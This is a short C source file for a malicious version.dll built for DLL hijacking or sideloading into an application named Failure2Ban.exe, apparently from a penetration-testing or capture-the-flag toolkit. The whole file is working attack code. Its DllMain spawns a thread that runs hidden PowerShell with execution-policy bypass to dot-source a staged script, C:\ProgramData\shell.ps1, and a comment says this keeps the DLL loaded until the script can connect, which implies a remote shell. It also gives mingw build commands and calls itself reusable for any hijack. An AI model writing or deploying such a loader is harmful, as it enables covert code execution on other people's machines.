/*
 * versiondll.c  —  Sideload launcher for Failure2Ban.exe
 *
 * On DLL_PROCESS_ATTACH, launches PowerShell and dot-sources a script
 * already staged on disk (C:\ProgramData\shell.ps1) — no inline
 * payload, no download, just an existing file being run.
 * Use for any DLL hijack / sideload that doesn't need
 * a named export — DllMain is the only entry point.
 *
 * Build (mingw), 32-bit only:
 *   Failure2Ban.exe is a 32-bit .NET assembly, so its CLR can only load
 *   a 32-bit DLL; a 64-bit build is rejected at load time.
 *   i686-w64-mingw32-gcc -shared -o version.dll versiondll.c -mwindows
 */

#include <windows.h>

static DWORD WINAPI run_shellscript(LPVOID param)
{
    /* Launch PowerShell hidden; dot-source the already-staged script */
    WinExec(
        "powershell.exe -ep bypass -w hidden "
        "-c \". C:\\ProgramData\\shell.ps1\"",
        SW_HIDE);
    Sleep(5000); /* keep the DLL loaded until the script can connect */
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        /* Run off the loader lock so DllMain returns TRUE cleanly */
        CreateThread(NULL, 0, run_shellscript, NULL, 0, NULL);
    }
    return TRUE;
}
